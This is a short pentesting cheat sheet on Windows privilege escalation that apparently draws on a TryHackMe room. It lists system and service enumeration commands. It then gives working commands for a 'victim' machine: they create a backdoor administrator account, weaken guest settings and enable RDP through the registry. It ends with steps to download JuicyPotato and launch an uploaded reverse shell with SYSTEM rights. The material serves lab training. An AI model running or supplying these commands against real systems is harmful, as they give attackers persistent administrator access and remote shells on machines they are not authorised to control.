# Windows

**Copy info from here:** [**https://tryhackme.com/room/windowsprivesc20**](https://tryhackme.com/room/windowsprivesc20)



## **Gathering Info**

```
whoami /priv
```

```
net user
```

```
systeminfo
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
dir c:\
```

```
dir "c:\program files"
```

```
dir "c:\program files (x86)"
```

```
wmic service get name,startname
```

```
wmic service get name,pathname,startname | findstr "Program Files"
```

```
cacls *.exe
```

### **Recent Files**

Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.

<figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>



## Add User

**Victim**

```
net user backdoor pass!123 /add
net localgroup Administrators backdoor /add
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
```

**Enable RDP**

**Victim**

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



## Privilege Escalation

**Juicy Potato**

* Download Juicy Potato to your attack machine
* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```



